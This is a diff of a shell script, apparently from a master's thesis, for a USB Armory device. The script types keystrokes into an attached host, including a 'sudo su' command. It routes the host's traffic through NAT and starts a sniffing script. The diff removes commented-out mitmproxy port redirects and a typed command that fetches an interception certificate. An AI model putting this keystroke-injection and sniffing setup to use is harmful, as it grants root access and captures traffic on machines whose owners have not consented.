@@ -30,10 +30,6 @@ sudo iptables -P OUTPUT ACCEPT
 echo "Add masquerading for all pakets..."
 sudo iptables -t nat -A POSTROUTING -o usb0 -j MASQUERADE
 
-echo "Set up mitmproxy-stuff..."
-#sudo iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 80 -j REDIRECT --to-port 8080
-#sudo iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 443 -j REDIRECT --to-port 8080
-
 echo "Print iptables-list..."
 sudo iptables -t nat -L
 
@@ -46,9 +42,6 @@ export delay=0.05
 
 $p2p "\\\"\c\at\\\"" $lang
 sleep 2
-
-#$p2p "resiye -s 10 10\\n" $lang
-#sleep $delay
 
 #required password for host (hardcoded for masterthesis!)
 $p2p "sudo su\\n" $lang
@@ -132,16 +125,4 @@ $p2p "exit\\n" $lang
 sleep 2
 echo "Start Sniffing"
 /home/usbarmory/Sniff.sh
-
-#sleep 4
-
-#$p2p "\\\"\c\at\\\"" $lang
-#sleep 2
-
-#$p2p "firefox http://mitm.it/cert/pem\\n" $lang
-#sleep 2
-#$p2p " \t \t \t\t\\n" $lang
-#sleep $delay
-#$p2p "\cq" $lang
-#$p2p "exit\\n" $lang
 
